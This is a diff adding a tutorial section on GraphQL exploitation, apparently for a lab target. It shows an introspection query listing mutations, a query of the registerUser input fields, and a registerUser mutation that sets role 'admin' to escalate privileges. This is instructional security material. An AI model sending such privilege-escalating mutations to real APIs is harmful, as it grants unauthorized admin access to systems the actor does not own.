@@ -392,6 +392,119 @@ query {
 
 ---
 
+## 1.7 - Example Exploitation with Mutations
+
+Let us start by identifying all mutations supported by the backend and their arguments. We will use the following introspection query:
+
+```
+query {
+  __schema {
+    mutationType {
+      name
+      fields {
+        name
+        args {
+          name
+          defaultValue
+          type {
+            ...TypeRef
+          }
+        }
+      }
+    }
+  }
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+From the result, we can identify a mutation `registerUser`, presumably allowing us to create new users. The mutation requires a `RegisterUserInput` object as an input:
+
+<img width="1127" height="588" alt="image" src="https://github.com/user-attachments/assets/85c29e72-8f34-4017-a80a-ee94c49c2280" />
+
+We can now query all fields of the `RegisterUserInput` object with the following introspection query to obtain all fields that we can use in the mutation:
+
+```
+{   
+  __type(name: "RegisterUserInput") {
+    name
+    inputFields {
+      name
+      description
+      defaultValue
+    }
+  }
+}
+```
+
+From the result, we can identify that we can provide the new user's `username`, `password`, `role`, and `msg`:
+
+<img width="1121" height="592" alt="image" src="https://github.com/user-attachments/assets/81984aa7-d742-4f24-990c-d21fa95256e0" />
+
+As we identified earlier, we need to provide the password as an MD5-hash. To hash our password, we can use the following command:
+
+```
+$ echo -n 'password' | md5sum
+
+5f4dcc3b5aa765d61d8327deb882cf99  -
+```
+
+With the hashed password, we can now finally register a new user by running the mutation:
+
+```
+mutation {
+  registerUser(input: {username: "vautiaAdmin", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "admin", msg: "Hacked!"}) {
+    user {
+      username
+      password
+      msg
+      role
+    }
+  }
+}
+```
+
+In the result, we can see that the role admin is reflected, which indicates that the attack was successful:
+
+<img width="1133" height="292" alt="image" src="https://github.com/user-attachments/assets/aafb4f57-2d5f-4fa4-8515-c577661d9c06" />
+
+After logging in, we can now access the admin endpoint, meaning we have successfully escalated our privileges:
+
+<img width="1141" height="407" alt="image" src="https://github.com/user-attachments/assets/ca661f00-94e7-4325-b4fa-0f9d8761de88" />
+
+---
+
 ## Subscriptions: Real-Time Updates
 
 Subscriptions keep a connection open (typically via WebSockets) so the server can push updates to the client the moment something changes — great for chat apps, live dashboards, or collaborative editing tools.
